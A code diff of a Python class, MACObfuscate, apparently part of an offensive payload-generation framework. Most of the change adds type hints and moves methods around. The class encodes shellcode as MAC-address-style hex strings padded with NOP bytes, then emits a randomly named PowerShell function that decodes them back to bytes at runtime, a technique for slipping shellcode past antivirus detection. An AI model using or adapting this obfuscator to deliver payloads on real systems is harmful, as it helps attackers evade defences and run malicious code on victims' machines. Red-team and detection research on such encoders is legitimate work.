@@ -3,15 +3,30 @@ import string
 
 class MACObfuscate:
 
-    def __init__(self, arguments):
+    def __init__(self, arguments: dict) -> None:
         self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
 
-    def imports(self):
+    def imports(self) -> list[str]:
         return []
 
-    def codeblock(self):
-        return """
-function {name} {{
+    def compilerOptions(self) -> list[str]:
+        return []
+
+    def obfuscate(self, decoded: bytes) -> list[str]:
+        encoded = []
+        for i in range(0, len(decoded), 6):
+            chunk = decoded[i:i+6]
+            if len(chunk) < 6:
+                chunk = chunk + (b"\x90" * (6 - len(chunk)))
+            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
+        return encoded
+
+    def transformer(self, shellcodestring: str) -> str:
+        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
+
+    def codeblock(self) -> str:
+        return f"""
+function {self.name} {{
     [CmdletBinding()]
     [OutputType([byte[]])]
     param(
@@ -35,19 +50,4 @@ function {name} {{
         return $decoded
     }}
 }}
-""".format(name = self.name)
-    
-    def compilerOptions(self):
-        return []
-
-    def obfuscate(self, decoded):
-        encoded = []
-        for i in range(0, len(decoded), 6):
-            chunk = decoded[i:i+6]
-            if len(chunk) < 6:
-                chunk = chunk + (b"\x90" * (6 - len(chunk)))
-            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
-        return encoded
-
-    def transformer(self, shellcodestring):
-        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
+"""
